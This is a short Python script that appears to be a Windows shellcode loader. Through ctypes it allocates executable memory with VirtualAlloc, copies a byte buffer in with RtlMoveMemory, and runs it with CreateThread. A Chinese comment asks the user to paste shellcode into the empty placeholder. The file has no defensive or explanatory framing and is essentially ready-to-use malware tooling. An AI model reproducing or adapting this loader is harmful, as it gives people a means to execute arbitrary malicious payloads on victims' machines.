#/usr/bin/python3
#-*-  encoding: utf-8 -*-
#Time: 2021/09/19/ 23:52
#Author: LZJ

from ctypes import *

vir = windll.kernel32.VirtualAlloc
rtl = windll.kernel32.RtlMoveMemory
ct = windll.kernel32.CreateThread
wfso = windll.kernel32.WaitForSingleObject

def body():

    #此处填写shellcode
    shellcode = b""

    shellcode = bytearray(shellcode)

    vir.restype = c_uint64
    ptr = vir(
        c_int(0),
        c_int(len(shellcode)),
        c_int(0x3000),
        c_int(0x00000040)
    )
    buf = (c_char * len(shellcode)).from_buffer(shellcode)
    rtl(
        c_uint64(ptr),
        buf,
        c_int(len(shellcode))
    )

    handler = ct(
        c_int(0),
        c_int(0),
        c_uint64(ptr),
        c_int(0),
        c_int(0),
        pointer(c_int(0))
    )

    wfso(
        c_int(handler),
        c_int(-1)
    )

if __name__ == "__main__":
    body()
